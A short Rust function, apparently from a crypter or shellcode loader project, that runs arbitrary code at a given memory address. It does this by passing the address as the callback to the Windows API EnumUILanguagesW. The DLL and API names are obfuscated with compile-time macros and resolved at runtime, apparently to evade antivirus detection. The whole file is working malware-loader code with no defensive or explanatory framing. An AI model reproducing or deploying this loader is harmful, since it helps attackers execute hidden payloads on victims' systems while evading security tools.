pub unsafe fn exec(p: usize) -> Result<(), String> {
    use std::ffi::c_void;
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes};
    use std::mem::transmute;
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_enum_uilanguages = get_proc_address(kernel32, obf_lit_bytes!(b"EnumUILanguagesW\0").as_slice())?;
    type EnumUILanguagesFn = unsafe extern "system" fn(*mut c_void, u32, isize) -> i32;
    let enum_uilanguages: EnumUILanguagesFn = transmute(p_enum_uilanguages);
    enum_uilanguages(p as *mut c_void, 0, 0);
    Ok(())
}